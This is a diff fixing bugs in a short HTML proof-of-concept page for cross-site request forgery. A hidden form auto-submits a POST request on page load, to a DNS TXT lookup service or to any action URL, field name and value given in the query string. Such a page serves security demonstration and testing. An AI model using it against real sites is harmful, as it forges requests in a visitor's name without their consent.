@@ -1,19 +1,20 @@
 <form name="csrfForm" action="https://www.showmyip.com/dns-txt-lookup/" method="POST">
-  <input name="input" type="hidden" name="dname" value="txt4.jub0bs.dev">
+  <input id="input" type="hidden" name="dname" value="txt4.jub0bs.dev">
 </form>
 <script>
-  const params = new URLSearchParams(location);
+  const params = new URLSearchParams(location.search);
   const action = params.get('action');
   if (action) {
     document.csrfForm.action = action;
   }
+  const input = document.getElementById('input');
   const name = params.get('name');
   if (name) {
-    document.input.name = name;
+    input.name = name;
   }
   const value = params.get('value');
   if (value) {
-    document.input.value = value;
+    input.value = value;
   }
   document.csrfForm.submit()
 </script>
